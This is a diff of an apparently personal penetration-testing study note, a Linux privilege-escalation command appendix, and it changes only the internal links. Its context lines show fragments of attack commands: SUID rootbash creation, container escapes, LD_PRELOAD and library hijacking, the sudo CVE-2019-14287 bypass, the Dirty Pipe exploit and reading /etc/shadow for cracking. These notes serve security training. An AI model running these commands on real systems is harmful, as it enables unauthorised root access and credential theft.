@@ -1,6 +1,6 @@
 # Linux Privilege Escalation, Command Appendix
 
-Part of [[COMMAND APPENDIX]]. All commands from Module 18 (Linux Privilege Escalation). Full technique walkthroughs: [[Linux Privilege Escalation]]. Decision tree: [[Linux Privilege Escalation (Decision Tree)]].
+Part of [[COMMAND APPENDIX]]. All commands from Module 18 (Linux Privilege Escalation). Full technique walkthroughs: [[18. Linux Privilege Escalation|Linux Privilege Escalation]]. Decision tree: [[Linux Privilege Escalation (Decision Tree)]].
 
 ---
 
@@ -311,7 +311,7 @@ chmod +x /tmp/cp
 /tmp/rootbash -p
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.4. Path Abuse|LPE.4]].
+See [[18. Linux Privilege Escalation|LPE.4]].
 
 #### Tags: #PathAbuse #LinuxPrivesc
 
@@ -339,7 +339,7 @@ less /etc/passwd
 !bash
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.5. Escaping Restricted Shells|LPE.5]].
+See [[18. Linux Privilege Escalation|LPE.5]].
 
 #### Tags: #RestrictedShell #ShellEscape #LinuxPrivesc
 
@@ -367,7 +367,7 @@ cat /etc/shadow
 # Crack offline with hashcat
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.8. Privileged Groups|LPE.8]].
+See [[18. Linux Privilege Escalation|LPE.8]].
 
 #### Tags: #PrivilegedGroups #admGroup #LinuxPrivesc
 
@@ -399,7 +399,7 @@ cp /mnt/root/bin/bash /mnt/root/tmp/rootbash && chmod +s /mnt/root/tmp/rootbash
 # On host: /tmp/rootbash -p
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.12. LXD Privilege Escalation|LPE.12]].
+See [[18. Linux Privilege Escalation|LPE.12]].
 
 #### Tags: #LXD #ContainerEscape #LinuxPrivesc
 
@@ -426,7 +426,7 @@ cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
 # Exit container, then on host: /tmp/rootbash -p
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.13. Docker Privilege Escalation|LPE.13]].
+See [[18. Linux Privilege Escalation|LPE.13]].
 
 #### Tags: #Docker #DockerEscape #LinuxPrivesc
 
@@ -455,7 +455,7 @@ chmod +x /tmp/payload
 echo "test" >> /var/log/some_writable.log
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.14. Logrotate Privilege Escalation|LPE.14]].
+See [[18. Linux Privilege Escalation|LPE.14]].
 
 #### Tags: #Logrotate #logrotten #LinuxPrivesc
 
@@ -481,7 +481,7 @@ ls -la /share/rootbash   # confirm rws
 /share/rootbash -p
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.15. NFS No Root Squash|LPE.15]].
+See [[18. Linux Privilege Escalation|LPE.15]].
 
 #### Tags: #NFS #NoRootSquash #LinuxPrivesc
 
@@ -514,7 +514,7 @@ gcc -fPIC -shared -o /tmp/privesc.so /tmp/privesc.c -nostartfiles
 sudo LD_PRELOAD=/tmp/privesc.so <sudo-allowed-binary>
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.17. Shared Libraries (LD_PRELOAD)|LPE.17]].
+See [[18. Linux Privilege Escalation|LPE.17]].
 
 #### Tags: #LDPreload #SharedLibrary #LinuxPrivesc
 
@@ -553,7 +553,7 @@ gcc -fPIC -shared -o /development/lib/libcustom.so /development/lib/libcustom.c
 
 **Check glibc version:** `ldd --version`
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.18. Shared Object Hijacking|LPE.18]].
+See [[18. Linux Privilege Escalation|LPE.18]].
 
 #### Tags: #SharedObject #SOHijacking #LinuxPrivesc
 
@@ -589,7 +589,7 @@ sudo PYTHONPATH=/tmp python3 /opt/script.py
 /tmp/rootbash -p
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.19. Python Library Hijacking|LPE.19]].
+See [[18. Linux Privilege Escalation|LPE.19]].
 
 #### Tags: #PythonHijack #LibraryHijacking #LinuxPrivesc
 
@@ -611,7 +611,7 @@ sudo -u#-1 /usr/bin/ncdu
 sudo -u#-1 /bin/bash
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.20. Sudo User ID -1 Bypass (CVE-2019-14287)|LPE.20]].
+See [[18. Linux Privilege Escalation|LPE.20]].
 
 #### Tags: #SudoBypass #CVE201914287 #LinuxPrivesc
 
@@ -633,7 +633,7 @@ bash 41154.sh
 /tmp/rootsh -p
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.10. Vulnerable Services (GNU Screen)|LPE.10]].
+See [[18. Linux Privilege Escalation|LPE.10]].
 
 #### Tags: #GNUScreen #VulnerableService #LinuxPrivesc
 
@@ -656,7 +656,7 @@ gcc -o dirtypipe dirtypipe.c
 # Drops root shell or modifies /etc/passwd to add passwordless root user
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.22. Dirty Pipe CVE-2022-0847|LPE.22]].
+See [[18. Linux Privilege Escalation|LPE.22]].
 
 #### Tags: #DirtyPipe #CVE20220847 #KernelExploit #LinuxPrivesc
 
@@ -686,7 +686,7 @@ Expected: any password typed interactively to `su`, `sudo`, or `ssh` appears in 
 
 **Required permissions:** readable `/var/log/audit/audit.log`, typically requires being in the `adm` group or running as root. The `webdev` user in AEN had implicit audit log access.
 
-See [[Attacking Enterprise Networks (HTB Supplementary)#AEN.4. Initial Access|AEN.4]] for the real-world example.
+See [[27. Assembling the Pieces|AEN.4]] for the real-world example.
 
 #### Tags: #aureport #AuditLogs #CredentialHunting #LinuxPrivesc #adm #HTBSupplementary
 
